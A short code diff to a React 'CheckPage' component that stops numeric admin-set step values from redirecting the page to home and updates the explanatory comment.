@@ -87,11 +87,9 @@ export default function CheckPage() {
           } else if (step === "pin") {
             console.log("[check] Admin redirecting to pin")
             window.location.href = "/confi"
-          } else if (typeof step === "number") {
-            console.log("[check] Admin redirecting to home with step:", step)
-            window.location.href = "/"
           }
-          // If step === "payment" or "check", stay on this page
+          // Numeric currentStep (from main.tsx internal step tracking) is ignored.
+          // If step === "payment" or "check" (or any other value), stay on this page
         }
       },
       (error) => {
